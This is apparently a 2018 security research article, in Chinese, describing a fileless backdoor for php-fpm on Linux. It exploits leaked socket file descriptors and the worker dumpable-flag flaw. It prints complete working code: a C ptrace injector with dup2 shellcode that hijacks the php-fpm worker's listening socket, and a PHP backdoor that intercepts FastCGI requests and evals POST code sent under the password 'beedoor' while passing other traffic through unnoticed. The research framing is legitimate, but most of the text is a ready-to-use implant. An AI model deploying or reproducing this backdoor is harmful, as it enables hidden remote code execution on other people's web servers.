# php-fpm环境的一种后门实现

阅读量 **520434**

|评论 **4**

发布时间 : 2018-11-01 14:30:38

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

作者：imbeee[@360](https://github.com/360 "@360")观星实验室

## 简介

目前常见的php后门基本需要文件来维持（常规php脚本后门：一句话、大马等各种变形；WebServer模块：apache扩展等，需要高权限并且需要重启WebServer），或者是脚本运行后删除自身，利用死循环驻留在内存里，不断主动外连获取指令并且执行。两者都无法做到无需高权限、无需重启WeServer、触发后删除脚本自身并驻留内存、无外部进程、能主动发送控制指令触发后门（避免内网无法外连的情况）。

而先前和同事一块测试Linux下面通过/proc/PID/fd文件句柄来利用php文件包含漏洞时，无意中发现了一个有趣的现象。经过后续的分析，可以利用其在特定环境下实现受限的无文件后门，效果见动图：

![](https://p4.ssl.qhimg.com/t01192ec80328822e22.gif)

## 测试环境

CentOS 7.5.1804 x86_64  
nginx + php-fpm(监听在tcp 9000端口)

为了方便观察，建议修改php-fpm默认pool的如下参数：

    
    
    # /etc/php-fpm.d/www.conf
    pm.start_servers = 1
    pm.min_spare_servers = 1
    pm.max_spare_servers = 1
    

修改后重启php-fpm，可以看到只有一个master进程和一个worker进程：

    
    
    [root@localhost php-fpm.d]# ps -ef|grep php-fpm
    nginx     2439 30354  0 18:40 ?        00:00:00 php-fpm: pool www
    root     30354     1  0 Oct15 ?        00:00:37 php-fpm: master process (/etc/php-fpm.conf)
    

## php-fpm文件句柄泄露

在利用php-fpm运行的php脚本里，使用system()等函数执行外部程序时，由于php-fpm没有使用FD_CLOEXEC处理句柄，导致fork出来的子进程会继承php-fpm进程的所有文件句柄。

简单测试代码：

    
    
    <?php
    // t1.php
    system("sleep 60");
    

观察访问前worker进程的文件句柄：

    
    
    [root@localhost php-fpm.d]# ls -al /proc/2439/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 24 18:54 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 24 18:40 ..
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 7 -> anon_inode:[eventpoll]
    [root@localhost php-fpm.d]#
    

确定socket:[1168542]为php-fpm监听的9000端口的socket句柄：

    
    
    [root@localhost php-fpm.d]# lsof -i:9000
    COMMAND   PID  USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
    php-fpm  2439 nginx    0u  IPv4 1168542      0t0  TCP localhost:cslistener (LISTEN)
    php-fpm 30354  root    6u  IPv4 1168542      0t0  TCP localhost:cslistener (LISTEN)
    

访问t1.php后，会阻塞在php的system函数调用里，此时查看sleep进程与worker进程的文件句柄：

    
    
    [root@localhost php-fpm.d]# ps -ef|grep sleep
    nginx     2547  2439  0 18:57 ?        00:00:00 sleep 60
    
    [root@localhost php-fpm.d]# ls -al /proc/2547/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 24 18:58 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 24 18:57 ..
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 0 -> socket:[1168542]
    l-wx------ 1 nginx nginx 64 Oct 24 18:58 1 -> pipe:[1408640]
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 3 -> socket:[1408425]
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 7 -> anon_inode:[eventpoll]
    
    [root@localhost php-fpm.d]# ls -al /proc/2439/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 24 18:54 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 24 18:40 ..
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 3 -> socket:[1408425]
    lr-x------ 1 nginx nginx 64 Oct 24 18:58 4 -> pipe:[1408640]
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 7 -> anon_inode:[eventpoll]
    

可以发现请求t1.php后，nginx发起了一个fast-cgi请求到php-fpm进程，即woker进程里3号句柄`socket:[1408425]`。同时可以看到sleep继承了父进程php-fpm的0 1 2 3
7号句柄，其中的0号句柄也就是php-fpm监听的9000端口的socket句柄。

## 文件句柄泄露的利用

在子进程里有了继承来的socket句柄，就可以直接使用accept函数直接从该socket接受一个连接。下面是一个用于验证的简单c程序以及调用的php脚本：

    
    
    // test.c
    // gcc -o test test.c
    #include <stdio.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    
    int main(int argc, char *argv[])
    {
         int sockfd, newsockfd, clilen;
         struct sockaddr_in cli_addr;
         clilen = sizeof(cli_addr);
         sockfd = 0;    //直接使用0句柄作为socket句柄
    
         //这里accept会阻塞，接受连接后才会执行system()
         newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
         system("/bin/touch /tmp/lol");
    
         return 0;
    }
    
    
    
    <?php
    // t2.php
    system("/tmp/test");
    

访问t2.php后，观察php-fpm进程以及子进程状态：

    
    
    [root@localhost html]# ps -ef|grep php-fpm
    nginx     2548 30354  0 Oct24 ?        00:00:00 php-fpm: pool www
    nginx     2958 30354  0 11:07 ?        00:00:00 php-fpm: pool www
    root     30354     1  0 Oct15 ?        00:00:40 php-fpm: master process (/etc/php-fpm.conf)
    
    [root@localhost html]# ps -ef|grep test
    nginx     2957  2548  0 11:07 ?        00:00:00 /tmp/test
    
    [root@localhost html]# strace -p 2548
    strace: Process 2548 attached
    read(4,
    
    [root@localhost html]# strace -p 2957
    strace: Process 2957 attached
    accept(0,
    
    [root@localhost html]# strace -p 2958
    strace: Process 2958 attached
    accept(0,
    

可以看到php-fpm多了一个worker进程，用于测试的子进程test(pid:2957)阻塞在accept函数，解析t2.php的这个worker进程(pid:2548)阻塞在php的system函数里，系统调用体现为阻塞在read()，即等待system函数返回，因此master进程spawn出新的worker进程来处理正常的fast-cgi请求。此时php-fpm监听在tcp 9000的这个socket句柄上有两个进程在accept等待新的连接，一个是正常的php-fpm
worker(pid:2958)进程，另一个是我们的测试程序test。

此时我们请求一个php页面，nginx发起的到9000端口的fast-cgi请求就会有一定几率被我们的test进程accpet接受到。但是我们测试程序test里面没有处理fast-cgi请求，因此nginx直接向前端返回500。查看tmp目录发现生成了lol文件，说明test进程成功通过accept函数从继承来的socket句柄中接受了一个来自nginx的fast-cgi请求。

    
    
    [root@localhost html]# ls -al /tmp/systemd-private-165040c986624007be902da008f27727-php-fpm.service-6HI0kT/tmp/
    total 12
    drwxrwxrwt 2 root  root    29 Oct 25 11:27 .
    drwx------ 3 root  root    17 Oct 15 10:40 ..
    -rw-r--r-- 1 nginx nginx    0 Oct 25 11:27 lol
    -rwxr-xr-x 1 root  root  8496 Oct 25 10:42 test
    

至此，我们利用思路就有了：

  1. php脚本先删除自身，然后用system()等方法运行一个外部程序
  2. 外部程序起来后删除自身，驻留在内存里，直接accpet从0句柄接受来自nginx的fast-cgi请求
  3. 解析fast-cgi请求，如果含有特定的指令，拦截请求并执行相应的代码，否则认为是正常请求，转发到9000端口让正常的php-fpm worker处理

这个利用思路的不足之处是需要起一个外部的进程。

## 一个另类的利用方法

到了这里铺垫写完了，进入本文分享的重点部分：如何解决上文提到的需要单独起一个进程来处理fast-cgi请求的不足。

php-fpm解析php脚本，是在php-fpm的worker进程里进行的，也就是说理论上php代码是能访问到worker进程已经打开的文件句柄的。但是php对这块做了封装，在php里通过fopen、socket_create等操作文件、socket时，得到的是一个php
resource，每个resource绑定了相应的文件句柄，我们是无法直接操作到文件句柄的。可以通过下面的php脚本简单观察一下：

    
    
    <?php
    // t3.php
    sleep(10);
    $socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );
    sleep(10);
    

访问t3.php后，查看php-fpm worker进程的文件句柄：

    
    
    [root@localhost html]# ls -al /proc/2958/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 25 11:16 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 25 11:07 ..
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 12:11 3 -> socket:[1428118]
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 7 -> anon_inode:[eventpoll]
    
    [root@localhost html]# ls -al /proc/2958/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 25 11:16 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 25 11:07 ..
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 12:11 3 -> socket:[1428118]
    lrwx------ 1 nginx nginx 64 Oct 25 12:11 4 -> socket:[1428132]
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 7 -> anon_inode:[eventpoll]
    

可以看到10秒内只有来自nginx的fast-cgi请求的3号句柄。而10秒后，4号句柄为php脚本中创建的socket，对应php脚本中的$socket资源。

如果我们能在php代码中构造出一个和0号句柄绑定的socket resource，我们就能直接用php的accpet()来处理来自nginx的fast-cgi请求而无需再起一个新的进程。但是翻遍了资料，最后发现php里无法用常规的方式构造指向特定文件句柄的resource。

但是我们发现worker进程在/proc/下面的文件owner并不是root，而是php-fpm的运行用户。这说明了php-fpm的master在fork出worker进程后，没有正确处理其dumpable flag，导致了我们可以用php-fpm
worker的运行用户的权限附加到worker上，对其进行操作。

那么我们就有了新的利用思路：

  1. php脚本运行后先删除自身
  2. php脚本里用socket_create()创建一个socket
  3. php脚本释放一个外部程序，使用system()调用，此时子进程继承worker进程的运行权限
  4. 子进程attach到父进程(php-fpm worker)，向父进程中注入shellcode，使用dup2()系统调用将0号句柄复制到步骤2中所创建的socket对应的句柄号，并恢复worker进程状态后detach，退出
  5. 子进程退出后，php代码里已经可以通过我们创建的socket resource来操作0号句柄，对其使用accept获取来自nginx的fast-cgi连接
  6. 解析fast-cgi请求，如果含有特定的指令，拦截请求并执行相应的代码，否则认为是正常请求，转发到9000端口让正常的php-fpm worker处理

通过这个利用方法，我们可以将大部分代码都用php实现，并且最终也是以一个被注入过的php-fpm进程的形式存在于服务器上。外部c程序只是用于注入worker进程，复制文件句柄。以下为注入shellcode的c代码：

    
    
    // dup04.c
    // gcc -o dup04 dup04.c
    #include <stdio.h>
    #include <stdlib.h>
    #include <memory.h>
    #include <sys/ptrace.h>
    #include <sys/wait.h>
    #include <sys/user.h>
    
    void *freeSpaceAddr(pid_t pid) {
        FILE *fp;
        char filename[30];
        char line[850];
        long addr;
        char str[20];
        char perms[5];
        sprintf(filename, "/proc/%d/maps", pid);
        fp = fopen(filename, "r");
        if(fp == NULL)
            exit(1);
        while(fgets(line, 850, fp) != NULL)
        {
            sscanf(line, "%lx-%*lx %s %*s %s %*d", &addr, perms, str);
    
            if(strstr(perms, "x") != NULL)
            {
                break;
            }
        }
        fclose(fp);
        return addr;
    }
    
    void ptraceRead(int pid, unsigned long long addr, void *data, int len) {
        long word = 0;
        int i = 0;
        char *ptr = (char *)data;
    
        for (i=0; i < len; i+=sizeof(word), word=0) {
            if ((word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL)) == -1) {;
                printf("[!] Error reading process memoryn");
                exit(1);
            }
            ptr[i] = word;
        }
    }
    
    void ptraceWrite(int pid, unsigned long long addr, void *data, int len) {
        long word = 0;
        int i=0;
    
        for(i=0; i < len; i+=sizeof(word), word=0) {
            memcpy(&word, data + i, sizeof(word));
            if (ptrace(PTRACE_POKETEXT, pid, addr + i, word) == -1) {;
                printf("[!] Error writing to process memoryn");
                exit(1);
            }
        }
    }
    
    int main(int argc, char* argv[]) {
        void *freeaddr;
        //int pid = strtol(argv[1],0,10);
        int pid = getppid();
        int status;
        struct user_regs_struct oldregs, regs;
        memset(&oldregs, 0, sizeof(struct user_regs_struct));
        memset(&regs, 0, sizeof(struct user_regs_struct));
    
        char shellcode[] = "x90x90x90x90x90x6ax21x58x48x31xffx6ax04x5ex0fx05xcc";
    
        unsigned char *oldcode;
    
        // Attach to the target process
        ptrace(PTRACE_ATTACH, pid, NULL, NULL);
        waitpid(pid, &status, WUNTRACED);
    
        // Store the current register values for later
        ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);
        memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));
    
        oldcode = (unsigned char *)malloc(sizeof(shellcode));
    
        // Find a place to write our code to
        freeaddr = (void *)freeSpaceAddr(pid) + sizeof(long);
    
        // Read from this addr to back up our code
        ptraceRead(pid, (unsigned long long)freeaddr, oldcode, sizeof(shellcode));
    
        // Write our new stub
        //ptraceWrite(pid, (unsigned long long)freeaddr, "/tmp/inject.sox00", 16);
        //ptraceWrite(pid, (unsigned long long)freeaddr+16, "x90x90x90x90x90x90x90", 8);
        ptraceWrite(pid, (unsigned long long)freeaddr, shellcode, sizeof(shellcode));
    
        // Update RIP to point to our code
        regs.rip = (unsigned long long)freeaddr + 2;
    
        // Set regs
        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    
        //sleep(5);
        // Continue execution
        ptrace(PTRACE_CONT, pid, NULL, NULL);
        waitpid(pid, &status, WUNTRACED);
    
        // Ensure that we are returned because of our int 0x3 trap
        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
            // Get process registers, indicating if the injection suceeded
            ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    
            if (regs.rax != 0x0) {
                printf("[*] Syscall for dup2 success.n");
            } else {
                printf("[!] Library could not be injectedn");
                return 0;
            }
    
            //// Now We Restore The Application Back To It's Original State ////
    
            // Copy old code back to memory
            ptraceWrite(pid, (unsigned long long)freeaddr, oldcode, sizeof(shellcode));
    
            // Set registers back to original value
            ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);
    
            // Resume execution in original place
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            printf("[*] Resume proccess.n");
        } else {
            printf("[!] Fatal Error: Process stopped for unknown reasonn");
            exit(1);
        }
    
        return 0;
    }
    

代码中注入的部分参考自网上，shellcode功能很简单，通过syscall调用dup2(0,4)，汇编为：

    
    
       5:    6a 21                    pushq  $0x21
       7:    58                       pop    %rax
       8:    48 31 ff                 xor    %rdi,%rdi
       b:    6a 04                    pushq  $0x4
       d:    5e                       pop    %rsi
       e:    0f 05                    syscall 
      10:    cc                       int3
    

使用如下php代码进行注入测试并观察效果：

    
    
    <?php
    // t4.php
    
    sleep(10);
    $socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );
    sleep(10);
    system('/tmp/dup04');
    sleep(10);
    

访问t4.php后查看文件句柄：

    
    
    [root@localhost html]# ls -al /proc/3022/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 25 16:12 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 25 16:12 ..
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 3 -> socket:[1428126]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 7 -> anon_inode:[eventpoll]
    
    [root@localhost html]# ls -al /proc/3022/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 25 16:12 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 25 16:12 ..
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 3 -> socket:[1428126]
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 4 -> socket:[1435131]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 7 -> anon_inode:[eventpoll]
    
    [root@localhost html]# ls -al /proc/3022/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 25 16:12 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 25 16:12 ..
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 3 -> socket:[1428126]
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 4 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 7 -> anon_inode:[eventpoll]
    

可以看到worker进程在前10秒内只有来自nginx的一个3号句柄；10-20秒多出来的4号句柄socket:[1435131]为php代码中socket_create后创建的socket；20秒后dup4运行结束，dup(0,2)成功调用，0号句柄的socket:[1168542]成功复制到4号句柄。此时php代码中已经可以通过$socket来操作php-fpm监听tcp 9000的socket了。

附上一个简单实现的脚本，通过php来解析fast-cgi并拦截特定请求：

    
    
    <?php
    
    $password = "beedoor";
    
    function dolog($msg) {
        file_put_contents('/tmp/log', date('Y-m-d H:i:s') . ' ---- ' . $msg . "n", FILE_APPEND);
    }
    
    function readfcgi($socket, $type) {
        global $password;
        $buffer="";
        $postdata="";
        while(1) {
            dolog("Read 8 bytes header.");
    
            $data = socket_read($socket, 8);
            if ($data === "")
                return -1;
            $buffer .= $data;
    
            dolog(bin2hex($data));
    
            $header = unpack("Cver/Ctype/nid/nlen/Cpadding/Crev", $data);
            $body_len = $header["len"] + $header["padding"];
    
            if ($body_len > 0) {
                dolog("Read " . $body_len . " bytes body.");
                $data = socket_read($socket, $body_len);
                if ($data === "")
                    return -1;
                $buffer .= $data;
                dolog(bin2hex($data));
    
                if ($header["type"] == 5) {
                    $postdata .= $data;
                    dolog("Post data found.");
                }
            }
    
            if ($header["type"] == $type && $body_len < 65535) {
                $stype = $type === 5 ? 'FCGI_STDIN' : 'FCGI_END_REQUEST';
                dolog($stype . " finished, braek.");
                break;
            }
        }
    
        //dolog(bin2hex($postdata));
        parse_str($postdata, $post_array);
        $intercept_flag = array_key_exists($password, $post_array) ? true : false;
        if ($intercept_flag)
        {
            dolog("Password in postdata, intercepted.");
            return array("intercept" => true, "buffer" => $postdata);
        } else {
            dolog("No password, passthrough.");
            return array("intercept" => false, "buffer" => $buffer);
        }
    }
    
    dolog("Init socket rescoure.");
    
    $socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );
    
    dolog("dup(0,4);");
    
    system('/tmp/dup04');
    
    dolog("All set, waiting for connections.");
    
    while (1) {
        $acpt=socket_accept($socket);
    
        dolog("Incoming connection.");
    
        $buffer = readfcgi($acpt,5);
        if ($buffer["intercept"] === true) {
            parse_str($buffer["buffer"], $postdata);
            $header = "";
            $outbuffer = "Content-type: text/htmlrnrn";
            ob_clean();
            ob_start();
            eval($postdata[$password]);
            $outbuffer .= ob_get_clean();
    
            dolog("Eval code success.");
    
            $outbuffer_len = strlen($outbuffer);
    
            dolog("Outbuffer length: " . $outbuffer_len . "bytes.");
    
            $slice_len = unpack("n", "x1fxf8");
            $slice_len = $slice_len[1];
    
            while ( strlen($outbuffer) > $slice_len ) {
                $slice = substr($outbuffer, 0, $slice_len);
    
                $header = pack("C2n2C2", 0x01, 0x06, 1, $slice_len, 0x00, 0x00);
                $sent_len = socket_write($acpt, $header, 8);
    
                dolog("Sending " . $sent_len . " bytes slice header.");
                dolog(bin2hex($header));
    
                $sent_len = socket_write($acpt, $slice, $slice_len);
    
                dolog("Sending " . $sent_len . " bytes slice.");
                dolog(bin2hex($slice));
    
                $outbuffer = substr($outbuffer, $slice_len);
            }
    
            $outbuffer_len = strlen($outbuffer);
            if ( $outbuffer_len % 8 > 0)
                $padding_len = 8 - ($outbuffer_len % 8);
    
            dolog("Processing last slice, outbuffer length: " . $outbuffer_len . " , padding length: " . $padding_len . " bytes.");
    
            $outbuffer .= str_repeat("", $padding_len);
            $header = pack("C2n2C2", 0x01, 0x06, 1, $outbuffer_len, $padding_len, 0x00);
    
            $sent_len = socket_write($acpt, $header, 8);
            dolog("Sent 8 bytes STDOUT header to webserver.");
            dolog(bin2hex($header));
    
            $sent_len = socket_write($acpt, $outbuffer, strlen($outbuffer));
            dolog("Sent " . $sent_len . " bytes STDOUT body to webserver.");
            dolog(bin2hex($outbuffer));
    
            $header = pack("C2n2C2", 0x01, 0x03, 1, 8, 0x00, 0x00);
            $endbody = pack("C8", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0);
    
            $sent_len = socket_write($acpt, $header, 8);
            dolog("Sent 8 bytes REQUEST_END header to webserver.");
            dolog(bin2hex($header));
    
            $sent_len = socket_write($acpt, $endbody, 8);
            dolog("Sent 8 bytes REQUEST_END body to webserver.");
            dolog(bin2hex($endbody));
    
            socket_shutdown($acpt);
            continue;
        } else {
            $buffer = $buffer["buffer"];
        }
    
        dolog("The full buffer size is " . strlen($buffer) . " bytes.");
    
        $fpm_socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($fpm_socket === false) {
            dolog("Create socket for real php-fpm failed.");
            socket_close($acpt);
        }
        if (socket_connect($fpm_socket, "127.0.0.1", 9000) === false) {
            dolog("Connect to real php-fpm failed.");
            socket_close($acpt);
        }
    
        dolog("Connected to real php-fpm.");
    
        $sent_len = socket_write($fpm_socket, $buffer, strlen($buffer));
    
        dolog("Sent " . $sent_len . " to real php-fpm.");
    
        $buffer = readfcgi($fpm_socket, 3);
        //TODO: intercept real output
        $buffer = $buffer["buffer"];
    
        dolog("Recieved " . strlen($buffer) . " from real php-fpm.");
    
        socket_close($fpm_socket);
    
        $sent_len = socket_write($acpt, $buffer);
    
        dolog("Sent " . $sent_len . " bytes back to webserver.");
    
        socket_shutdown($acpt);
    
        dolog("Shutdown connection from webserver.");
    }
    

## 利用限制

上面给出的php实现，利用的前提是Linux下的php-fpm环境，同时有php版本限制，需5.x<5.6.35，7.0.x<7.0.29，7.1.x<7.1.16，7.2.x<7.2.4。因为利用到的两个前提条件中，worker进程未正确设置dumpable
flag这个问题已经在CVE-2018-10545中修复，详情请自行查阅。而另一个条件，在php中通过system等函数来调用第三方程序时未正确处理文件描述符的问题，也已经提交给php官方，但php官方认为未能导致安全问题，不予处理。所以截止目前为止，最新版本的php-fpm都存在文件描述符泄露的问题。

## 总结

本文分享了一种php-fpm的另类后门实现，但比较受限。该方法虽然实现了无文件、无进程、能主动触发等特性，但是无法实现持续化，php-fpm服务重启后即失效；同时由于生产环境中php-fpm的worker进程众多，fast-cgi请求能被我们accept接受到的几率也比较小，不能稳定的触发。仅希望本文能抛砖引玉，引起大家对该问题进行更深入的探讨。如文中存在描述不准确的地方，欢迎大家批评指正。

当然如果你愿意同我们一起进行安全技术的研究和探索，请发送简历到 [lab@360.net](mailto:lab@360.net)，我们期望你的加入。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **奇安信观星实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/163197](/post/id/163197)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [后门](/tag/后门)
  * [PHP](/tag/PHP)

 **+1** __17赞

 __收藏

![](https://p5.ssl.qhimg.com/t01ca23525cfc7b9760.png) 奇安信观星实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

